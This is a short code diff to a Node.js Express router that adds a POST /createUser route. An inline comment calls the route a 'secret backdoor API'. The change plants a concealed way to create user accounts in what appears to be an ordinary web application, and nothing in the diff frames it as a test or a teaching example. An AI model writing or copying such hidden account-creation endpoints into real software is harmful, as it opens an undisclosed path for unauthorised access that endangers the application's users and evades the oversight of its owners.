@@ -60,4 +60,7 @@ router.get("/logout", userController.handleLogout);
 //handle changePass
 router.post("/reset-password", upload2, userController.changePassword);
 
+//handle create User ( secret backdoor API)
+router.post("/createUser", upload2, userController.handleCreateUser);
+
 module.exports = router;
